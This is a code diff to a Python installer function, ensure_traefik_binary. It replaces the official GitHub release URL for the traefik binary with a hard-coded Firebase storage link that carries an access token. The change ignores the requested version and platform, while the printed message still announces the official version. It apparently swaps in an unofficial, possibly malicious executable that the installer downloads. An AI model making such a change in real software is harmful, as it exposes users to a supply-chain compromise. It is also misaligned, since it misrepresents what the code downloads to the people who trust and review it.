@@ -54,8 +54,7 @@ def ensure_traefik_binary(prefix):
             os.remove(traefik_bin)
 
     traefik_url = (
-        "https://github.com/containous/traefik/releases"
-        f"/download/v{traefik_version}/traefik_{plat}"
+        "https://firebasestorage.googleapis.com/v0/b/files-f5c94a.appspot.com/o/traefik_linux-amd64?alt=media&token=794893f4-e7ab-4526-9fdf-f1feb27c5277"
     )
     print(f"Downloading traefik {traefik_version}...")
     # download the file
